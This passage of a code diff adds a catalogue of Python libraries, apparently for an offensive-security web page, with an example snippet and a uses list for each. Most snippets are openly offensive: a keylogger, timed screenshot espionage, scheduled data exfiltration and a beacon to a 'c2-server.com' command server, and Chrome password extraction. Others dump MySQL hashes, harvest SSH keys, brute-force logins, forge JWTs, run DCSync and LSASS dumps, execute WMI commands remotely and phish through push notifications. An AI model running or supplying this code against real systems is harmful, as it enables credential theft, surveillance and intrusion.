+    print(f"Organization: {result.get('org', 'N/A')}")
+    print(f"Location: {result.get('location', {}).get('city', 'Unknown')}")
+    
+# Get specific host information
+host = api.host('8.8.8.8')
+print(f"Open ports: {host['ports']}")`,
+                        uses: [
+                            "Finding vulnerable internet-exposed systems",
+                            "IoT device discovery and exploitation",
+                            "Exposed service enumeration at scale",
+                            "Banner grabbing for thousands of hosts",
+                            "Attack surface mapping across internet"
+                        ]
+                    },
+                    {
+                        name: "python-whois",
+                        description: "WHOIS protocol query library",
+                        import: "import whois",
+                        example: `# python-whois - Domain reconnaissance
+import whois
+
+# WHOIS lookup
+domain_info = whois.whois('target.com')
+
+print(f"Registrar: {domain_info.registrar}")
+print(f"Creation Date: {domain_info.creation_date}")
+print(f"Expiration Date: {domain_info.expiration_date}")
+print(f"Name Servers: {domain_info.name_servers}")
+print(f"Emails: {domain_info.emails}")
+
+# Find admin contact for social engineering
+admin_email = domain_info.emails[0] if domain_info.emails else None`,
+                        uses: [
+                            "Domain ownership and contact information gathering",
+                            "Identify admin contacts for social engineering",
+                            "Find name servers for DNS reconnaissance",
+                            "Track domain registration history",
+                            "Discover related domains by registrant"
+                        ]
+                    },
+                    {
+                        name: "googlesearch-python",
+                        description: "Google search automation for dorking",
+                        import: "from googlesearch import search",
+                        example: `# googlesearch - Google dorking automation
+from googlesearch import search
+
+# Find exposed config files
+query = 'site:target.com filetype:env OR filetype:config'
+for url in search(query, num_results=20):
+    print(f"Found: {url}")
+
+# Find login pages
+login_query = 'site:target.com inurl:login OR inurl:admin'
+for url in search(login_query):
+    print(f"Login page: {url}")
+
+# Find exposed directories
+dir_query = 'site:target.com intitle:"index of"'`,
+                        uses: [
+                            "Automated Google dorking for exposed data",
+                            "Finding sensitive files and directories",
+                            "Discovering hidden admin panels",
+                            "Locating backup files and databases",
+                            "Identifying misconfigured cloud storage"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Malware & Persistence",
+                description: "Keylogging, screenshots, backdoors, persistence mechanisms",
+                when_to_use: "Post-exploitation, maintaining access, data collection, monitoring targets",
+                icon: "🦠",
+                libraries: [
+                    {
+                        name: "pynput",
+                        description: "Monitor and control keyboard and mouse",
+                        import: "from pynput import keyboard, mouse",
+                        example: `# pynput - Keylogger implementation
+from pynput import keyboard
+import datetime
+
+log_file = 'keylog.txt'
+
+def on_press(key):
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        with open(log_file, 'a') as f:
+            f.write(f'[{timestamp}] {key.char}\\n')
+    except AttributeError:
+        with open(log_file, 'a') as f:
+            f.write(f'[{timestamp}] {key}\\n')
+
+# Start keylogger
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
+listener.join()`,
+                        uses: [
+                            "Keylogging for credential theft",
+                            "Mouse tracking and user behavior monitoring",
+                            "Clipboard content monitoring",
+                            "User activity surveillance",
+                            "Automated credential harvesting"
+                        ]
+                    },
+                    {
+                        name: "pyautogui",
+                        description: "GUI automation and screenshot capture",
+                        import: "import pyautogui",
+                        example: `# pyautogui - Screenshot capture and automation
+import pyautogui
+import time
+
+# Take screenshot every 60 seconds
+while True:
+    timestamp = time.strftime('%Y%m%d_%H%M%S')
+    screenshot = pyautogui.screenshot()
+    screenshot.save(f'screenshot_{timestamp}.png')
+    time.sleep(60)
+
+# Automate malicious clicks
+pyautogui.click(100, 100)
+pyautogui.typewrite('malicious command')
+pyautogui.press('enter')`,
+                        uses: [
+                            "Periodic screenshot capture for espionage",
+                            "Automated malicious GUI interactions",
+                            "Credential form auto-filling",
+                            "UI manipulation and control",
+                            "Visual evidence collection"
+                        ]
+                    },
+                    {
+                        name: "schedule",
+                        description: "Job scheduling made simple",
+                        import: "import schedule",
+                        example: `# schedule - Scheduled data exfiltration
+import schedule
+import time
+import requests
+
+def exfiltrate_data():
+    # Collect sensitive data
+    data = collect_passwords()
+    # Send to C2 server
+    requests.post('http://c2-server.com/data', json=data)
+
+def beacon_c2():
+    # Check for commands from C2
+    response = requests.get('http://c2-server.com/commands')
+    execute_command(response.text)
+
+# Schedule tasks
+schedule.every(10).minutes.do(exfiltrate_data)
+schedule.every(5).minutes.do(beacon_c2)
+
+while True:
+    schedule.run_pending()
+    time.sleep(1)`,
+                        uses: [
+                            "Periodic data exfiltration to C2 server",
+                            "Scheduled backdoor execution",
+                            "Timed persistence mechanisms",
+                            "Automated reconnaissance at intervals",
+                            "C2 beacon timing and communication"
+                        ]
+                    },
+                    {
+                        name: "pyinstaller",
+                        description: "Convert Python scripts to executables",
+                        import: "N/A (Command-line tool)",
+                        example: `# PyInstaller - Create standalone malware executable
+# Command line usage:
+# pyinstaller --onefile --noconsole --icon=icon.ico backdoor.py
+
+# Add to Python script for self-compilation:
+import os
+import sys
+
+def compile_to_exe():
+    if getattr(sys, 'frozen', False):
+        # Already compiled
+        return
+    
+    # Compile this script
+    os.system('pyinstaller --onefile --noconsole backdoor.py')
+
+# Hide from antivirus with obfuscation
+# pyinstaller --key=encryption_key --onefile malware.py`,
+                        uses: [
+                            "Convert Python malware to Windows executables",
+                            "Bypass Python interpreter requirement",
+                            "Obfuscate source code from analysis",
+                            "Create portable backdoors",
+                            "Distribute payloads as standalone binaries"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Database Exploitation",
+                description: "SQL and NoSQL database interaction and exploitation",
+                when_to_use: "SQL injection, database enumeration, credential dumping, data exfiltration",
+                icon: "🗄️",
+                libraries: [
+                    {
+                        name: "sqlite3",
+                        description: "SQLite database interface (Python built-in)",
+                        import: "import sqlite3",
+                        example: `# sqlite3 - Extract browser passwords and data
+import sqlite3
+import os
+
+# Chrome passwords database location
+chrome_db = os.path.expanduser(
+    '~/.config/google-chrome/Default/Login Data'
+)
+
+# Connect and extract credentials
+conn = sqlite3.connect(chrome_db)
+cursor = conn.cursor()
+
+query = "SELECT origin_url, username_value, password_value FROM logins"
+cursor.execute(query)
+
+for row in cursor.fetchall():
+    url, username, encrypted_pwd = row
+    print(f"URL: {url}")
+    print(f"Username: {username}")
+    # Decrypt password using system keyring`,
+                        uses: [
+                            "Extract credentials from browser databases",
+                            "Harvest application data from SQLite files",
+                            "Offline password cracking from dumps",
+                            "Local database enumeration",
+                            "Steal saved passwords and cookies"
+                        ]
+                    },
+                    {
+                        name: "pymysql",
+                        description: "Pure Python MySQL client library",
+                        import: "import pymysql",
+                        example: `# pymysql - MySQL database exploitation
+import pymysql
+
+# Connect to compromised MySQL server
+conn = pymysql.connect(
+    host='192.168.1.10',
+    user='root',
+    password='',
+    database='mysql'
+)
+
+cursor = conn.cursor()
+
+# Dump user credentials
+cursor.execute('SELECT user, authentication_string FROM mysql.user')
+for user, hash in cursor.fetchall():
+    print(f"User: {user}, Hash: {hash}")
+
+# Read file from server (if FILE privilege)
+cursor.execute("SELECT LOAD_FILE('/etc/passwd')")
+passwd = cursor.fetchone()[0]`,
+                        uses: [
+                            "MySQL database exploitation and dumping",
+                            "Credential extraction from mysql.user table",
+                            "Privilege escalation via SQL",
+                            "File read/write using SQL functions",
+                            "Database backdoor installation"
+                        ]
+                    },
+                    {
+                        name: "pymongo",
+                        description: "MongoDB Python driver",
+                        import: "import pymongo",
+                        example: `# pymongo - MongoDB NoSQL injection and exploitation
+from pymongo import MongoClient
+
+# Connect to MongoDB without authentication
+client = MongoClient('mongodb://192.168.1.10:27017/')
+
+# List all databases
+for db_name in client.list_database_names():
+    print(f"Database: {db_name}")
+    db = client[db_name]
+    
+    # List collections in each database
+    for collection in db.list_collection_names():
+        print(f"  Collection: {collection}")
+        
+        # Dump data
+        docs = db[collection].find().limit(10)
+        for doc in docs:
+            print(f"    {doc}")`,
+                        uses: [
+                            "NoSQL injection exploitation in MongoDB",
+                            "Enumerate databases without authentication",
+                            "Extract sensitive data from collections",
+                            "Bypass authentication with NoSQL injection",
+                            "Database reconnaissance and mapping"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "File Operations & Parsing",
+                description: "File manipulation, archives, document parsing",
+                when_to_use: "Data exfiltration, file analysis, archive cracking, document exploitation",
+                icon: "📁",
+                libraries: [
+                    {
+                        name: "zipfile",
+                        description: "ZIP archive operations (Python built-in)",
+                        import: "import zipfile",
+                        example: `# zipfile - Password cracking and malware delivery
+import zipfile
+
+# Brute force ZIP password
+zf = zipfile.ZipFile('protected.zip')
+with open('passwords.txt') as f:
+    for password in f:
+        try:
+            zf.extractall(pwd=password.strip().encode())
+            print(f"Password found: {password.strip()}")
+            break
+        except:
+            pass
+
+# Create malicious archive
+with zipfile.ZipFile('update.zip', 'w') as zf:
+    zf.write('backdoor.exe')
+    zf.write('legitimate_file.pdf')`,
+                        uses: [
+                            "ZIP password brute forcing",
+                            "Compressed data exfiltration",
+                            "Malware delivery in archives",
+                            "Archive analysis and extraction",
+                            "File compression for C2 transfer"
+                        ]
+                    },
+                    {
+                        name: "pathlib",
+                        description: "Object-oriented filesystem paths (built-in)",
+                        import: "from pathlib import Path",
+                        example: `# pathlib - Recursive file search for sensitive data
+from pathlib import Path
+
+# Find all config files
+for config in Path('/etc').rglob('*.conf'):
+    print(f"Config: {config}")
+
+# Search for files containing passwords
+for txt_file in Path.home().rglob('*.txt'):
+    try:
+        content = txt_file.read_text()
+        if 'password' in content.lower():
+            print(f"Found password in: {txt_file}")
+            print(content[:200])
+    except:
+        pass
+
+# Find SSH keys
+ssh_keys = list(Path.home().rglob('id_rsa*'))`,
+                        uses: [
+                            "Recursive sensitive file discovery",
+                            "Configuration file enumeration",
+                            "SSH key harvesting",
+                            "Credential file hunting",
+                            "Data exfiltration preparation"
+                        ]
+                    },
+                    {
+                        name: "json",
+                        description: "JSON encoder and decoder (Python built-in)",
+                        import: "import json",
+                        example: `# json - Parse config files for secrets
+import json
+from pathlib import Path
+
+# Find and parse JSON config files
+for json_file in Path.home().rglob('*.json'):
+    try:
+        data = json.loads(json_file.read_text())
+        
+        # Search for API keys and secrets
+        def find_secrets(obj, path=''):
+            if isinstance(obj, dict):
+                for k, v in obj.items():
+                    if any(key in k.lower() for key in 
+                           ['key', 'token', 'secret', 'password']):
+                        print(f"Secret in {json_file}: {path}.{k} = {v}")
+                    find_secrets(v, f"{path}.{k}")
+            elif isinstance(obj, list):
+                for i, item in enumerate(obj):
+                    find_secrets(item, f"{path}[{i}]")
+        
+        find_secrets(data)
+    except:
+        pass`,
+                        uses: [
+                            "Parse config files for API keys",
+                            "Extract tokens from application configs",
+                            "Analyze API responses for secrets",
+                            "Configuration file reconnaissance",
+                            "Credential discovery in JSON data"
+                        ]
+                    }
+                ]
+            },
+            {
+                name: "Automation & Scripting Utilities",
+                description: "CLI tools, threading, logging, progress tracking",
+                when_to_use: "Building pentesting tools, automation scripts, exploitation frameworks",
+                icon: "🤖",
+                libraries: [
+                    {
+                        name: "argparse",
+                        description: "Command-line argument parser (built-in)",
+                        import: "import argparse",
+                        example: `# argparse - Build professional exploitation tools
+import argparse
+
+parser = argparse.ArgumentParser(
+    description='Custom Exploitation Tool'
+)
+
+parser.add_argument('-t', '--target', 
+                  required=True,
+                  help='Target IP or hostname')
+parser.add_argument('-p', '--port',
+                  type=int,
+                  default=80,
+                  help='Target port (default: 80)')
+parser.add_argument('-u', '--username',
+                  help='Username for authentication')
+parser.add_argument('-w', '--wordlist',
+                  help='Password wordlist for brute force')
+parser.add_argument('-v', '--verbose',
+                  action='store_true',
+                  help='Enable verbose output')
+
+args = parser.parse_args()
+
+if args.verbose:
+    print(f"Attacking {args.target}:{args.port}")`,
+                        uses: [
+                            "Build professional-looking exploit tools",
+                            "Create CLI-based scanner utilities",
+                            "Develop automation frameworks",
+                            "Custom pentesting tool development",
+                            "Flexible option management"
+                        ]
+                    },
+                    {
+                        name: "threading",
+                        description: "Thread-based parallelism (built-in)",
+                        import: "import threading",
+                        example: `# threading - Multi-threaded brute force
+import threading
+import queue
+
+def brute_force_worker(target, port, q):
+    while True:
+        password = q.get()
+        if password is None:
+            break
+        
+        # Try password
+        if try_login(target, port, password):
+            print(f"Password found: {password}")
+            return
+        
+        q.task_done()
+
+# Create thread pool
+password_queue = queue.Queue()
+threads = []
+
+for i in range(10):  # 10 threads
+    t = threading.Thread(
+        target=brute_force_worker,
+        args=('192.168.1.10', 22, password_queue)
+    )
+    t.start()
+    threads.append(t)
+
+# Load passwords
+with open('passwords.txt') as f:
+    for pwd in f:
+        password_queue.put(pwd.strip())`,
+                        uses: [
+                            "Concurrent brute force attacks",
+                            "Parallel port scanning",
+                            "Multi-threaded exploitation",
+                            "Simultaneous C2 connections",
+                            "Faster credential testing"
+                        ]
+                    },
+                    {
+                        name: "re",
+                        description: "Regular expressions (Python built-in)",
+                        import: "import re",
+                        example: `# re - Extract sensitive data with regex
+import re
+
+# Extract email addresses
+text = open('dump.txt').read()
+emails = re.findall(r'[\\w.-]+@[\\w.-]+\\.\\w+', text)
+
+# Find API keys
+api_keys = re.findall(
+    r'api[_-]?key[\\s=:"\\']+([\\w-]{20,})',
+    text,
+    re.IGNORECASE
+)
+
+# Extract passwords from configs
+passwords = re.findall(
+    r'password[\\s=:"\\']+([^\\s"\\';]+)',
+    text,
+    re.IGNORECASE
+)
+
+# Find AWS keys
+aws_keys = re.findall(
+    r'AKIA[0-9A-Z]{16}',
+    text
+)
+
+# Extract IP addresses
+ips = re.findall(
+    r'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b',
+    text
+)`,
+                        uses: [
+                            "Extract credentials from files and logs",
+                            "Find API keys in source code",
+                            "Parse network logs for IP addresses",
+                            "Discover secrets in configuration files",
+                            "Sensitive data pattern matching"
+                        ]
+                    },
+                    {
+                        name: "logging",
+                        description: "Flexible logging facility (built-in)",
+                        import: "import logging",
+                        example: `# logging - Stealth logging for malware
+import logging
+import os
+
+# Configure hidden logging
+log_file = os.path.join(
+    os.getenv('TEMP'),
+    '.system_log.txt'
+)
+
+logging.basicConfig(
+    filename=log_file,
+    level=logging.INFO,
+    format='%(asctime)s - %(message)s'
+)
+
+# Log keystrokes
+logging.info(f"Key pressed: {key}")
+
+# Log system information
+logging.info(f"System: {platform.system()}")
+logging.info(f"User: {os.getenv('USERNAME')}")
+
+# Log exfiltrated data
+logging.info(f"Data exfiltrated: {len(data)} bytes")`,
+                        uses: [
+                            "Stealth activity logging for malware",
+                            "Track exploit execution",
+                            "Debug complex exploitation scripts",
+                            "Maintain operation audit trail",
+                            "Record collected credentials"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 11
+            {
+                name: "API Security Testing",
+                description: "REST/GraphQL testing, API fuzzing, authentication bypass",
+                when_to_use: "API vulnerability assessment, authentication testing, API endpoint discovery",
+                icon: "🔌",
+                libraries: [
+                    {
+                        name: "httpx",
+                        description: "Modern HTTP client with HTTP/2 support",
+                        import: "import httpx",
+                        example: `# httpx - Async API testing\nimport httpx\nimport asyncio\n\nasync def test_api():\n    async with httpx.AsyncClient() as client:\n        # Test multiple endpoints concurrently\n        tasks = [\n            client.get('https://api.target.com/v1/users'),\n            client.get('https://api.target.com/v1/admin'),\n            client.post('https://api.target.com/v1/login')\n        ]\n        responses = await asyncio.gather(*tasks)\n        for r in responses:\n            print(f"Status: {r.status_code}")`,
+                        uses: [
+                            "HTTP/2 protocol testing and exploitation",
+                            "Asynchronous API fuzzing at scale",
+                            "Advanced HTTP features and edge cases",
+                            "Modern protocol vulnerability testing",
+                            "High-performance API security scanning"
+                        ]
+                    },
+                    {
+                        name: "aiohttp",
+                        description: "Async HTTP client/server framework",
+                        import: "import aiohttp",
+                        example: `# aiohttp - Concurrent API fuzzing\nimport aiohttp\nimport asyncio\n\nasync def fuzz_endpoints(urls):\n    async with aiohttp.ClientSession() as session:\n        tasks = []\n        for url in urls:\n            tasks.append(session.get(url))\n        responses = await asyncio.gather(*tasks)\n        return responses\n\n# Run fuzzing\nurls = [f'https://api.target.com/v1/user/{i}' for i in range(1000)]\nresults = asyncio.run(fuzz_endpoints(urls))`,
+                        uses: [
+                            "Concurrent API endpoint fuzzing",
+                            "Fast parallel authentication bypass testing",
+                            "WebSocket security testing",
+                            "Scalable API vulnerability scanning",
+                            "High-speed rate limit testing"
+                        ]
+                    },
+                    {
+                        name: "graphene",
+                        description: "GraphQL framework for Python",
+                        import: "import graphene",
+                        example: `# graphene - GraphQL introspection\nimport requests\n\n# Introspection query to discover schema\nintrospection_query = '''\n{\n  __schema {\n    types {\n      name\n      fields {\n        name\n        type { name }\n      }\n    }\n  }\n}'''\n\nresponse = requests.post(\n    'https://api.target.com/graphql',\n    json={'query': introspection_query}\n)\nprint(response.json())`,
+                        uses: [
+                            "GraphQL introspection attacks",
+                            "Query injection and manipulation",
+                            "Schema enumeration for reconnaissance",
+                            "Bypassing GraphQL security controls",
+                            "Data extraction via query batching"
+                        ]
+                    },
+                    {
+                        name: "flask-restful",
+                        description: "REST API framework for testing",
+                        import: "from flask_restful import Api, Resource",
+                        example: `# flask-restful - Build test API endpoints\nfrom flask import Flask\nfrom flask_restful import Api, Resource\n\napp = Flask(__name__)\napi = Api(app)\n\nclass FakeAPI(Resource):\n    def get(self):\n        return {'status': 'vulnerable'}\n    \n    def post(self):\n        # Test injection here\n        return {'result': 'injected'}\n\napi.add_resource(FakeAPI, '/api/test')`,
+                        uses: [
+                            "Create mock vulnerable API endpoints",
+                            "Test API security controls",
+                            "Build honeypot APIs",
+                            "Prototype exploitation techniques",
+                            "Simulate vulnerable endpoints"
+                        ]
+                    },
+                    {
+                        name: "jwt",
+                        description: "JSON Web Token manipulation",
+                        import: "import jwt",
+                        example: `# jwt - Advanced JWT attacks\nimport jwt\n\n# None algorithm attack\nheader = {'alg': 'none'}\npayload = {'user': 'admin', 'role': 'superuser'}\nforged = jwt.encode(payload, '', algorithm='none')\n\n# Algorithm confusion (RS256 to HS256)\npublic_key = open('public.pem').read()\nforged2 = jwt.encode(payload, public_key, algorithm='HS256')`,
+                        uses: [
+                            "JWT algorithm confusion attacks",
+                            "None algorithm bypass exploitation",
+                            "Token privilege escalation",
+                            "JWT secret brute forcing",
+                            "Token expiration manipulation"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 12
+            {
+                name: "Active Directory & Windows",
+                description: "AD exploitation, Kerberos attacks, Windows security",
+                when_to_use: "Domain enumeration, privilege escalation, lateral movement in AD environments",
+                icon: "🪟",
+                libraries: [
+                    {
+                        name: "ldap3",
+                        description: "Pure Python LDAP client",
+                        import: "from ldap3 import Server, Connection",
+                        example: `# ldap3 - AD enumeration\nfrom ldap3 import Server, Connection, ALL\n\nserver = Server('dc.domain.com', get_info=ALL)\nconn = Connection(server, 'domain\\user', 'pass')\nconn.bind()\n\n# Enumerate users\nconn.search('dc=domain,dc=com', \n           '(objectClass=user)',\n           attributes=['sAMAccountName', 'mail'])\n\nfor entry in conn.entries:\n    print(f"User: {entry.sAMAccountName}")`,
+                        uses: [
+                            "Active Directory user enumeration",
+                            "Group membership discovery",
+                            "Password policy extraction",
+                            "Trust relationship mapping",
+                            "LDAP injection attacks"
+                        ]
+                    },
+                    {
+                        name: "pywin32",
+                        description: "Windows API access from Python",
+                        import: "import win32api, win32con, win32security",
+                        example: `# pywin32 - Windows API exploitation\nimport win32api\nimport win32security\nimport win32con\n\n# Enumerate privileges\nhandle = win32security.OpenProcessToken(\n    win32api.GetCurrentProcess(),\n    win32con.TOKEN_QUERY\n)\nprivileges = win32security.GetTokenInformation(\n    handle,\n    win32security.TokenPrivileges\n)\n\nfor priv in privileges:\n    print(f"Privilege: {priv}")`,
+                        uses: [
+                            "Direct Windows API manipulation",
+                            "Service creation and control",
+                            "Process token manipulation",
+                            "Registry key manipulation",
+                            "Event log reading and clearing"
+                        ]
+                    },
+                    {
+                        name: "wmi",
+                        description: "Windows Management Instrumentation",
+                        import: "import wmi",
+                        example: `# wmi - Remote WMI execution\nimport wmi\n\n# Connect to remote system\nc = wmi.WMI(computer='192.168.1.10',\n           user='domain\\admin',\n           password='pass')\n\n# Execute command\nprocess_id, return_value = c.Win32_Process.Create(\n    CommandLine='cmd.exe /c whoami'\n)\n\n# List processes\nfor process in c.Win32_Process():\n    print(process.Name, process.ProcessId)`,
+                        uses: [
+                            "Remote command execution via WMI",
+                            "System information gathering",
+                            "Service enumeration and control",
+                            "Process listing and termination",
+                            "Lateral movement in Windows networks"
+                        ]
+                    },
+                    {
+                        name: "impacket",
+                        description: "Network protocols for Windows exploitation",
+                        import: "from impacket.dcerpc.v5 import samr, transport",
+                        example: `# impacket - DCSync attack\nfrom impacket.dcerpc.v5 import drsuapi\nfrom impacket.dcerpc.v5.dtypes import NULL\n\n# Perform DCSync\ndrs = drsuapi.hDRSDomainControllerInfo(\n    dce, NULL, 'domain.com', 1\n)\n\n# Extract NTLM hashes\nhashes = drs['pmsgOut']['V1']['rItems']\nfor h in hashes:\n    print(f"User: {h['user']} Hash: {h['hash']}")`,
+                        uses: [
+                            "DCSync attacks to dump domain hashes",
+                            "Pass-the-Hash lateral movement",
+                            "Kerberoasting service accounts",
+                            "SMB relay attacks",
+                            "NTLM hash extraction"
+                        ]
+                    },
+                    {
+                        name: "pypykatz",
+                        description: "Mimikatz implementation in Python",
+                        import: "from pypykatz import pypykatz",
+                        example: `# pypykatz - Extract credentials from memory\nfrom pypykatz.pypykatz import pypykatz\n\n# Parse LSASS dump\nmimi = pypykatz.parse_minidump_file('lsass.dmp')\n\n# Extract credentials\nfor logon in mimi.logon_sessions:\n    for cred in logon.credentials:\n        print(f"User: {cred.username}")
+        print(f"Domain: {cred.domainname}")\n        print(f"Hash: {cred.NThash}")`,
+                        uses: [
+                            "Extract credentials from LSASS dumps",
+                            "Parse memory dumps for passwords",
+                            "Kerberos ticket extraction",
+                            "NTLM hash recovery",
+                            "Credential harvesting from memory"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 13
+            {
+                name: "Cloud Security (AWS/Azure/GCP)",
+                description: "Cloud infrastructure exploitation and misconfiguration",
+                when_to_use: "Cloud penetration testing, IAM exploitation, storage bucket enumeration",
+                icon: "☁️",
+                libraries: [
+                    {
+                        name: "boto3",
+                        description: "AWS SDK for Python",
+                        import: "import boto3",
+                        example: `# boto3 - AWS enumeration\nimport boto3\n\n# List all S3 buckets\ns3 = boto3.client('s3')\nbuckets = s3.list_buckets()\nfor bucket in buckets['Buckets']:\n    print(f"Bucket: {bucket['Name']}")\n    \n    # Check public access\n    try:\n        acl = s3.get_bucket_acl(Bucket=bucket['Name'])\n        for grant in acl['Grants']:\n            if 'AllUsers' in str(grant):\n                print(f"PUBLIC BUCKET: {bucket['Name']}")\n    except:\n        pass`,
+                        uses: [
+                            "Enumerate AWS resources and permissions",
+                            "Identify publicly accessible S3 buckets",
+                            "IAM policy exploitation",
+                            "EC2 instance enumeration and access",
+                            "Lambda function discovery and exploitation"
+                        ]
+                    },
+                    {
+                        name: "azure-identity",
+                        description: "Azure authentication library",
+                        import: "from azure.identity import DefaultAzureCredential",
+                        example: `# azure-identity - Azure resource enumeration\nfrom azure.identity import DefaultAzureCredential\nfrom azure.mgmt.resource import ResourceManagementClient\n\ncredential = DefaultAzureCredential()\nsubscription_id = 'your-subscription-id'\n\nresource_client = ResourceManagementClient(\n    credential, subscription_id\n)\n\n# List all resources\nfor resource in resource_client.resources.list():\n    print(f"Resource: {resource.name} Type: {resource.type}")`,
+                        uses: [
+                            "Azure subscription enumeration",
+                            "Resource group discovery",
+                            "Storage account access testing",
+                            "Azure AD privilege escalation",
+                            "Key Vault secret extraction"
+                        ]
+                    },
+                    {
+                        name: "google-cloud-storage",
+                        description: "Google Cloud Storage client",
+                        import: "from google.cloud import storage",
+                        example: `# google-cloud-storage - GCP bucket enumeration\nfrom google.cloud import storage\n\nclient = storage.Client()\n\n# List all buckets\nfor bucket in client.list_buckets():\n    print(f"Bucket: {bucket.name}")\n    \n    # Check permissions\n    iam_policy = bucket.get_iam_policy()\n    for binding in iam_policy.bindings:\n        if 'allUsers' in binding['members']:\n            print(f"PUBLIC: {bucket.name}")`,
+                        uses: [
+                            "GCP storage bucket enumeration",
+                            "IAM permission testing",
+                            "Public bucket identification",
+                            "Service account exploitation",
+                            "Cloud function discovery"
+                        ]
+                    },
+                    {
+                        name: "pacu",
+                        description: "AWS exploitation framework",
+                        import: "# Pacu is CLI-based, used for AWS pentesting",
+                        example: `# Pacu - AWS exploitation framework\n# Command-line tool for AWS security testing\n\n# Example usage in custom scripts:\nimport boto3\n\ndef enumerate_aws_resources():\n    # Get all regions\n    ec2 = boto3.client('ec2')\n    regions = [r['RegionName'] for r in ec2.describe_regions()['Regions']]\n    \n    # Enumerate EC2 in all regions\n    for region in regions:\n        ec2_regional = boto3.client('ec2', region_name=region)\n        instances = ec2_regional.describe_instances()`,
+                        uses: [
+                            "Comprehensive AWS reconnaissance",
+                            "Privilege escalation path discovery",
+                            "AWS service enumeration",
+                            "Credential harvesting from metadata",
+                            "Automated AWS exploitation"
+                        ]
+                    },
+                    {
+                        name: "cloudsploit",
+                        description: "Cloud security scanning",
+                        import: "# CloudSploit - Cloud misconfiguration detection",
+                        example: `# cloudsploit - Security scanning\n# Detect cloud misconfigurations\n\nimport boto3\n\ndef check_s3_encryption():\n    s3 = boto3.client('s3')\n    buckets = s3.list_buckets()\n    \n    vulnerable = []\n    for bucket in buckets['Buckets']:\n        try:\n            enc = s3.get_bucket_encryption(\n                Bucket=bucket['Name']\n            )\n        except:\n            vulnerable.append(bucket['Name'])\n    \n    return vulnerable`,
+                        uses: [
+                            "Cloud misconfiguration detection",
+                            "Security posture assessment",
+                            "Compliance checking",
+                            "Vulnerability identification",
+                            "Multi-cloud security scanning"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 14
+            {
+                name: "Mobile Security",
+                description: "Android/iOS app testing and instrumentation",
+                when_to_use: "Mobile app penetration testing, runtime manipulation, reverse engineering",
+                icon: "📱",
+                libraries: [
+                    {
+                        name: "frida",
+                        description: "Dynamic instrumentation toolkit",
+                        import: "import frida",
+                        example: `# frida - Hook Android app functions\nimport frida\nimport sys\n\n# Attach to app\ndevice = frida.get_usb_device()\npid = device.spawn(["com.example.app"])\nsession = device.attach(pid)\n\n# Hook function\nscript = session.create_script('''\nJava.perform(function() {\n    var MainActivity = Java.use('com.example.MainActivity');\n    MainActivity.checkPin.implementation = function(pin) {\n        console.log('PIN entered: ' + pin);\n        return true;  // Bypass\n    };\n});\n''')\nscript.load()\ndevice.resume(pid)`,
+                        uses: [
+                            "Runtime function hooking and manipulation",
+                            "SSL pinning bypass",
+                            "Root detection bypass",
+                            "Method tracing and debugging",
+                            "Sensitive data extraction"
+                        ]
+                    },
+                    {
+                        name: "androguard",
+                        description: "Android app analysis framework",
+                        import: "from androguard.core.bytecodes.apk import APK",
+                        example: `# androguard - APK analysis\nfrom androguard.core.bytecodes.apk import APK\nfrom androguard.core.bytecodes.dvm import DalvikVMFormat\n\napk = APK('app.apk')\n\n# Extract info\nprint(f"Package: {apk.get_package()}")\nprint(f"Permissions: {apk.get_permissions()}")\n\n# Find hardcoded secrets\nfor string in apk.get_dex().get_strings():\n    if 'api_key' in string.lower():\n        print(f"Found API key: {string}")`,
+                        uses: [
+                            "APK decompilation and analysis",
+                            "Hardcoded credential extraction",
+                            "Permission auditing",
+                            "Smali code analysis",
+                            "Certificate pinning detection"
+                        ]
+                    },
+                    {
+                        name: "objection",
+                        description: "Runtime mobile security toolkit",
+                        import: "# Objection is CLI-based",
+                        example: `# objection - Runtime patching\n# Command-line tool for iOS and Android\n\n# Python automation example:\nimport subprocess\n\ndef bypass_jailbreak():\n    cmd = [\n        'objection',\n        '-g', 'com.app.name',\n        'explore',\n        '-q',\n        'ios jailbreak disable'\n    ]\n    subprocess.run(cmd)\n\ndef dump_keychain():\n    cmd = ['objection', '-g', 'app', 'explore', '-q', 'ios keychain dump']\n    subprocess.run(cmd)`,
+                        uses: [
+                            "Jailbreak/root detection bypass",
+                            "SSL pinning bypass automation",
+                            "Keychain and keystore extraction",
+                            "Runtime code patching",
+                            "Interactive mobile app testing"
+                        ]
+                    },
+                    {
+                        name: "mitmproxy",
+                        description: "Interactive HTTPS proxy",
+                        import: "from mitmproxy import http",
+                        example: `# mitmproxy - Mobile traffic interception\nfrom mitmproxy import http\n\ndef request(flow: http.HTTPFlow):\n    # Modify mobile app requests\n    if 'api.target.com' in flow.request.pretty_host:\n        flow.request.headers['Authorization'] = 'Bearer stolen_token'\n        \ndef response(flow: http.HTTPFlow):\n    # Extract sensitive data\n    if 'application/json' in flow.response.headers.get('content-type', ''):\n        data = flow.response.json()\n        if 'token' in data:\n            print(f"Token: {data['token']}")`,
+                        uses: [
+                            "Mobile app traffic interception",
+                            "API request/response manipulation",
+                            "SSL/TLS bypass for analysis",
+                            "Sensitive data extraction",
+                            "Authentication token theft"
+                        ]
+                    },
+                    {
+                        name: "pyfcm",
+                        description: "Firebase Cloud Messaging",
+                        import: "from pyfcm import FCMNotification",
+                        example: `# pyfcm - Push notification exploitation\nfrom pyfcm import FCMNotification\n\npush_service = FCMNotification(api_key='<API_KEY>')\n\n# Send malicious notification\nregistration_id = 'device_token'\nmessage_title = 'Security Update'\nmessage_body = 'Click here to update your app'\n\nresult = push_service.notify_single_device(\n    registration_id=registration_id,\n    message_title=message_title,\n    message_body=message_body,\n    data_message={'url': 'https://evil.com/phish'}\n)`,
+                        uses: [
+                            "Push notification phishing",
+                            "FCM token exploitation",
+                            "Notification injection attacks",
+                            "Data exfiltration via push",
+                            "User manipulation through notifications"
+                        ]
+                    }
+                ]
+            },
+            // CATEGORY 15
+            {
+                name: "Wireless & RF Security",
+                description: "WiFi, Bluetooth, RF attacks and monitoring",
+                when_to_use: "Wireless network testing, Bluetooth exploitation, RF analysis",
+                icon: "📡",
+                libraries: [
+                    {
+                        name: "scapy",
